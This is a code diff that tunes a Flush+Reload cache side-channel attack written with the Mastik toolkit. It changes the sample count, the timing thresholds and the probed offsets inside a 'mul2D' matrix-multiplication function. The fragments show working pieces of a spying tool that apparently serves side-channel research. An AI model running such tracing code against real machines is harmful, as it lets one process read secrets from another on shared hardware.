@@ -16,15 +16,15 @@
  /*
   * These are the hyperparamters of the attack.
   * Adjust for calibration if needed.
-  * SAMPLES, SLOT, THRESHOLD, and MINTHRESHOLD should likely
+  * RECORDS, SLOT, THRESHOLD, and MINTHRESHOLD should likely
   * stay the same. However, you should run FR-Trace in the
   * Mastik toolkit to find your target machine's correct thresholds.
   * MAX_IDLE is the amount of time in clock cycles the program will
   * wait before quitting after it's last postive sample.
   */
- #define SAMPLES       2000000
- #define SLOT          2500 
- #define THRESHOLD     100
+ #define RECORDS       20000000
+ #define SLOT          2000
+ #define THRESHOLD     125
  #define MINTHRESHOLD  0
  #define MAX_IDLE      100000
  
@@ -33,19 +33,15 @@
   */
  char *monitor[] = {
    "mul2D",
-   "mul2D+160",
-   "mul2D+181",
-   "mul2D+203"
+   "mul2D+80",
  };
  
  /*
   *  Attributes for the monitored functions
   */
  char *_monitor_attrs[] = {
-   "Multiplication",
-   "Iteration (i)",
-   "Iteration (j)",
-   "Iteration (k)",
+   "Multiplication-1",
+   "Multiplication-2",
  };
  
  
@@ -160,13 +156,13 @@
    fprintf(stderr, "----------------------------------\n");
  
    // Initialize probes
-   uint16_t *res = (uint16_t *) malloc(SAMPLES * _nmonitor * sizeof(uint16_t));
-   for (int i = 0; i < SAMPLES * _nmonitor ; i+= 4096/sizeof(uint16_t))
+   uint16_t *res = (uint16_t *) malloc(RECORDS * _nmonitor * sizeof(uint16_t));
+   for (int i = 0; i < RECORDS * _nmonitor ; i+= 4096/sizeof(uint16_t))
      res[i] = 1;
    fr_probe(fr, res);
  
    // Trace the function calls
-   int l = fr_trace(fr, SAMPLES, res, SLOT, THRESHOLD, MAX_IDLE);
+   int l = fr_trace(fr, RECORDS, res, SLOT, THRESHOLD, MAX_IDLE);
  
    // Output to the file location
    fprintf(stderr, "Do analysis of collected data\n");
